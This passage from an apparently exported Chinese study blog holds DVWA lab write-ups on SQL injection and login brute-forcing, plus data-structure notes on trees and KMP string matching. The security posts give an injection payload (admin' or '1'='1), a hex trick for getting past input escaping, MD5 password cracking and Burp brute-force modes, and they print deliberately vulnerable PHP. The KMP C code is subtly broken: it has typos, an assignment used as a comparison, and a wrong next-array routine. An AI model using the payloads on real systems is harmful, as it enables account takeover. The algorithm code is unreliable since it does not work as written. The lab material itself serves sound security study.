<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817143842352.png" alt><br>ASCLL hex解密<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817144040718.png" alt></p>
<h3 id="查询自己想知道的"><a href="#查询自己想知道的" class="headerlink" title="查询自己想知道的"></a>查询自己想知道的</h3><p>比如user、password<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817144933961.png" alt><br>使用md5解密第一个来验证，确实是登录时候用的账号密码<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817145151291.png" alt></p>
<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817145813710.png" alt></p>
<p>可以看到他不给写东西了只可以下来表单，通过burp来进行sql注入，步骤和上面一样，注入位置是抓到的包的id，下图最后一行<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817145942734.png" alt></p>
<h3 id="注入点判断-1"><a href="#注入点判断-1" class="headerlink" title="注入点判断"></a>注入点判断</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150024751.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150059469.png" style="zoom:50%;"></p>
<h3 id="判断字段-1"><a href="#判断字段-1" class="headerlink" title="判断字段"></a>判断字段</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150519477.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150647418.png" alt><br>没返回错误代表有两个字段<br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150754237.png" alt><br><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150802608.png" alt><br>证明字段数为2</p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817151035776.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817150945392.png" alt></p>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817151935877.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817151734964.png" alt></p>
<p>这里table_schema=’dvwa’变成了0x64767761是因为源代码中有mysqli_real_escape_string函数，会将特殊符号转义，可以通过将引号内的内容转换成16进制跳过该函数</p>
<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152559684.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152530263.png" alt></p>
<h3 id="获取想知道的"><a href="#获取想知道的" class="headerlink" title="获取想知道的"></a>获取想知道的</h3><p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152859329.png" alt><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817152916391.png" alt></p>
<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>跳转到另一个页面</p>
<p><img src="/2022/08/17/sql%E6%B3%A8%E5%85%A5/image-20220817153035328.png" alt><br>经过多次尝试发现语法和low级别是一样的<br>源代码中多了limit函数限制一行输出，只要#注释掉就ok，应该是用来防治sqlmap一把梭的</p>
<h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>和暴力破解的impossible一样都使用了PDO技术，划清了代码与数据的界限，有效防御sql注入，同时只有返回查询的结果数量为1时才会成功输出，而Anti-CSRFtoken的加入进一步提高了安全性</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>树和森林</title>
    <url>/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>树的基本概念，有序树与无序树、森林以及其性质</p>
<span id="more"></span>
<h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p>非空树：有且仅有一个根节点</p>
<p><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220629122020259.png" style="zoom:67%;"></p>
<p>空树：节点数为0的树<br>没有后继的结点成为叶子节点（终端节点）<br><strong>除了根节点之外有且仅有一个前驱</strong></p>
<h3 id="子树"><a href="#子树" class="headerlink" title="子树"></a>子树</h3><p><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220629122304793.png" alt></p>
<p>子树互不相交</p>
<p><strong>树是一种递归定义的数据结构</strong></p>
<h3 id="节点之间的路径"><a href="#节点之间的路径" class="headerlink" title="节点之间的路径"></a>节点之间的路径</h3><p>路径是单向的，只能从上往下</p>
<h3 id="路径长度"><a href="#路径长度" class="headerlink" title="路径长度"></a>路径长度</h3><p>经过几条边</p>
<h3 id="结点，树的属性描述"><a href="#结点，树的属性描述" class="headerlink" title="结点，树的属性描述"></a>结点，树的属性描述</h3><p>结点的层次（深度）——从上往下数<br>结点的高度——从下往上数<br>树的高度（深度）——总共多少层<br>结点的度——有几个孩子（分支）<br>树的度——各结点的度的最大值<br>默认从一开始</p>
<h2 id="有序树vs无序树"><a href="#有序树vs无序树" class="headerlink" title="有序树vs无序树"></a>有序树vs无序树</h2><p><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220629123151781.png" alt></p>
<h2 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h2><p>森林是m棵互不相交的树的集合（m可为0，表示空森林）</p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>结点数=总度数+1<br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701140810203.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701140849174.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701140928499.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701141014648.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701141202675.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>朴素模式匹配算法和KPM算法</title>
    <url>/2022/08/16/%E6%9C%B4%E7%B4%A0%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E5%92%8CKPM%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>朴素模式匹配算法的代码实现和KMP以及其中next数组的求法</p>
<span id="more"></span>
<h2 id="朴素模式匹配算法"><a href="#朴素模式匹配算法" class="headerlink" title="朴素模式匹配算法"></a>朴素模式匹配算法</h2><p>字符串模式匹配：在主串中找到域模式串相同的子串，并返回其所在位置</p>
<p>子串：主串的一部分</p>
<p>模式串：不一定能在主串中找到</p>
<p>(暴力破解（穷举）)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]==T.ch[j])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;                <span class="comment">//指针后退重新开始匹配</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主串长度为n</p>
<p>模式串长度为m</p>
<p>最好时间复杂度=O(n)</p>
<p>最坏时间复杂度=O((n-m+1)m)=O(nm)</p>
<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>基于朴素模式算法优化而来</p>
<p><img src="/2022/08/16/%E6%9C%B4%E7%B4%A0%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E5%92%8CKPM%E7%AE%97%E6%B3%95/image-20220604181601977.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (S[i]!=T[j])</span><br><span class="line">    j=next[j];</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">	i++;</span><br><span class="line">	j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据模式串T，求出next数组——&gt;利用next数据进行匹配（主指针不回溯）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index_KMP</span><span class="params">(SString S,SString T,<span class="type">int</span> next[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">0</span> || S.ch[i]==T.ch[j ])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=next[j];          <span class="comment">//主串指针i不回溯，模式串向右移动，KMP算法核心</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最坏时间复杂度：O(m+n)     求next数组的时间复杂度O(m)模式匹配时间复杂度O(n)</p>
<h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a><strong>求next数组</strong></h2><p>任何模式串都一样</p>
<p>第一个字符不匹配时，next[1]=0</p>
<p>第二个字符不匹配时，next[2]=1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(SString S,SString T,<span class="type">int</span> *next)</span>&#123;</span><br><span class="line">    next[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    next[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> j=i;</span><br><span class="line">        <span class="keyword">while</span>(j&gt;<span class="number">2</span> &amp;&amp; T.ch[i<span class="number">-1</span>]!=T.ch[j<span class="number">-2</span>])&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.ch[i<span class="number">-1</span>]=T.ch[j<span class="number">-1</span>])&#123;</span><br><span class="line">            length++;</span><br><span class="line">            i--,j--;</span><br><span class="line">        &#125;</span><br><span class="line">        next[i]=length+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
        <tag>串</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解</title>
    <url>/2022/08/16/force/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>暴力破解或称为穷举法，是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止。例如一个已知是四位并且全部由数字组成的密码，其可能共有10000种组合，因此最多尝试10000次就能找到正确的密码。理论上利用这种方法可以破解任何一种密码，问题只在于如何缩短试误时间。有些人运用计算机来增加效率，有些人辅以字典来缩小密码组合的范围</p>
<span id="more"></span>
<h2 id="burp-suite-攻击模式"><a href="#burp-suite-攻击模式" class="headerlink" title="burp suite 攻击模式"></a>burp suite 攻击模式</h2><p>Sniper:对变量一次进行破解，多个标记依次进行。（俗话简单来说就是，用户名和密码用的是一套字典，破解的时候也只是导入一个字典，但是它会根据先破解用户名，破解出来以后急需破解密码这样的顺序，对于简单的用户名密码字典数目少的可以考虑）</p>
<p>Battering ram:对变量同时进行破解，多个标记同时进行。（这个也是只有一个字典但区别是，可以同时进行，就是先破解用户名破解完了继续破解密码，相比遇上一个速度更快）</p>
<p>Pitchfork:每一个变量标记对应一个字典，取每个字典的对应项。（这个意思就是，每个变量一个字典，破解的时候每个字典的一号对应另一个字典的一号进行破解，这样破解对于那些一一对应的用户名密码来说速度很快，但很明显我们没办法准确的定位用户名和密码，显然不适用于每个情况）</p>
<p>Cluster bomb：每个变量对应一个字典，并且进行交际破解，尝试各种组合，适合于用户名加密码破解。（这种情况就是普罗大众很容易明白理解的情况就是多个字典进行笛卡尔积，依次破解，这种就会有多种组合，时间上也是一个问题，当然对于需要用时很长的，我们可以添加进程，用来适量缩短时间）</p>
<h2 id="安全性low"><a href="#安全性low" class="headerlink" title="安全性low"></a>安全性low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );   <span class="comment">//进行一个md5加密</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;    <span class="comment">//存在sql注入</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false。查看源码可以看到采用get方式进行传值。<br>通过if语句看到服务器只验证了参数login是否被设置，没有任何的防爆破机制。<br>存在sql注入漏洞admin‘ or ’1‘=’1</p>
<p><img src="/2022/08/16/force/image-20220816155701955.png" alt><br>进行爆破<br><img src="/2022/08/16/force/image-20220816160817937.png" alt><br>可以看到用户名为admin与密码为password是报文长度不一样<br><img src="/2022/08/16/force/image-20220816160905106.png" alt><br>最终得到结果</p>
<h3 id="通过sql注入的方式"><a href="#通过sql注入的方式" class="headerlink" title="通过sql注入的方式"></a>通过sql注入的方式</h3><p><img src="/2022/08/16/force/image-20220816161358979.png" alt><br>即输入?username=admin’ or ‘1’=’1 也可以通过sql注入方式成功登录</p>
<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p>相比于low安全级主要多了以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，“， x1a) 进行转义，基本上能够抵御sql注入攻击，同时$pass做了md5校验，杜绝了通过参数password进行sql注入的问题，但是依然没有采用有效的防爆破机制。</p>
<p>方法和low难度一样，炸就完事</p>
<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ((<span class="title function_ 